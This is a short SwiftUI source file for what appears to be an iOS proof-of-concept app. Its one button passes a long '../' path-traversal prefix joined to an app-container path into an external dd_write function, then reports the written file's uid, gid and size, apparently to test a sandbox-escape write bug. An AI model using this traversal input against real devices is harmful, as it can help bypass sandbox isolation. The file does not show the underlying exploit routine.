import SwiftUI

struct ContentView: View {
    private let targetPath = "/var/mobile/Containers/Data/Application/6A65489C-F668-4C29-AFA2-4B1FE2C4C645/Documents/hellobommer_test"
    private let traversalPrefix = "../../../../../../../../../../.."

    @State private var running = false
    @State private var showAlert = false
    @State private var alertTitle = ""
    @State private var alertMessage = ""

    var body: some View {
        VStack(spacing: 24) {
            Button("Write") { runWrite() }
                .buttonStyle(.borderedProminent)
                .disabled(running)

            if running {
                ProgressView()
            }
        }
        .padding()
        .alert(alertTitle, isPresented: $showAlert) {
            Button("OK") {}
        } message: {
            Text(alertMessage)
        }
    }

    private func runWrite() {
        running = true
        let destination = targetPath
        let identifier = traversalPrefix + destination

        Task.detached {
            let result = dd_write(identifier, destination)

            // Check the file independently so UI shows uid regardless of return code
            var st = stat()
            let exists = withUnsafeMutablePointer(to: &st) { destination.withCString { stat($0, $1) } } == 0
            let fileInfo = exists
                ? "uid=\(st.st_uid) gid=\(st.st_gid) size=\(st.st_size)"
                : "file not found"

            await finish(
                title: result == 0 ? "Write OK" : "Write Failed",
                message: "\(destination)\n\(fileInfo)"
            )
        }
    }

    @MainActor
    private func finish(title: String, message: String) {
        running = false
        alertTitle = title
        alertMessage = message
        showAlert = true
    }
}
